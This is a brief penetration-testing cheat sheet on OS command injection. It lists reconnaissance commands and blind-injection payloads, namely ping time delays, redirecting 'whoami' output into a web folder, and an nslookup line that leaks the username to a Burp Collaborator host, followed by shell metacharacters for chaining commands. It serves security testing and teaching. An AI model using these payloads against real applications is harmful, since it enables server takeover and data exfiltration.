# ⭕ OS Command Injection

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

## <mark style="color:red;">Useful commands</mark>

| Purpose of command    |     Linux     |    Windows    |
| --------------------- | :-----------: | :-----------: |
| Name of current user  |     whoami    |     whoami    |
| Operating system      |    uname -a   |      ver      |
| Network configuration |  ifconfig -a  | ipconfig /all |
| Network connections   | netstat -tunl |  netstat -an  |
| Running processes     |     ps -ef    |    tasklist   |

## <mark style="color:red;">Blind OS command injection</mark>

| Method                                                                | Command                                                                                                                                  |
| --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Time delays                                                           | <pre><code>&#x26;ping -c 10 127.0.0.1
</code></pre><pre><code>||ping+-c+10+127.0.0.1+||
</code></pre>                                    |
| Redirecting output                                                    | <pre><code>||whoami>/var/www/images/output.txt||
</code></pre>                                                                           |
| <p>Out-Of-Band (OOB)<br>DNS lookup. You can use Burp Collaborator</p> | <p></p><pre><code>||nslookup+`whoami`.x.burpcollaborator.net||
</code></pre><pre><code>||nslookup+x.burpcollaborator.net||
</code></pre> |

## <mark style="color:red;">Useful meta characters</mark>

```
&
&&
|
||
;
Newline (0x0a or \n)
`injected command `
$( injected command )
```
